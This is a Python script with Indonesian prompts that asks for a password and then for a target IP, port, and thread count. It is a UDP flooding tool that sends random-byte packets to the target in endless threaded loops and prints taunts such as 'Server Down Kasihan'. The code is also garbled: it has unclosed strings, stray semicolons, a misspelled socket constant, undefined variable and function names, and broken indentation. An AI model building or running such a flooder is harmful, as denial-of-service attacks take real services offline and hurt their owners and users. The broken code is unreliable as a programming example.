import random

import socket

import threading

import os

import sys

os.system("clear")

print("\033[93m")

Password = input("MAUSKAN PASSWORD: ")

if Password=="Aryal": 

    print(f"""

Password yang anda masukan Benar !!

    """)

 print("""\033[070m

 

 

 

     _                     _ 

    / \   _ __ _   _  __ _| |

   / _ \ | '__| | | |/ _` | |

  / ___ \| |  | |_| | (_| | |

 /_/   \_\_|   \__, |\__,_|_|

               |___/         

 

 

                         """)

print("""\033[090

ip = str(input(" Masukan Ip Target "  ;))

port = int(input(" Masukan Port Target " ;))

choice = str(input(" Masukan Udp Y/N "  ;))

theards = int(input(" Masukan Packets Terserah "  ;))

times = int(input(" Masukan Theards Terserah "  ;)

)

def naybae():

    data = random._urandom(98989)

    i = random.choice(("[Spagethey]","[Spagethey]","[Spagethey]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for z in range(time):

                s.sendto(data,addr)

            print(i +" | Attack Package From Aryal Sent! | ")

        except:

            print("[!] | Server Down Kasihan !!!!! |")

def naybae2():

    data = random._urandom(16)

    i = random.choice(("[Spagethey]","[Spagethey]","[Spagethey]"))

    while True:

        try:

            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)

            s.connect((ip,port))

            s.send(data)

            for z in range(time):

                s.send(data)

            print(i +"| This Is Aryal Kids! |")

        except:

            s.close()

            print("[*] | Down lagi lol.... |")

            

 for a in range(threds):

    if choice == "y":

        th = threading.Thread(target = Spagethey)

        th.start()

    else:

        th = threading.Thread(target = Spagethey)

        th.start

else :

    print("Password anda salah Silahkan coba ulangi lagi nanti")

print("Added Tools By Spagethey"
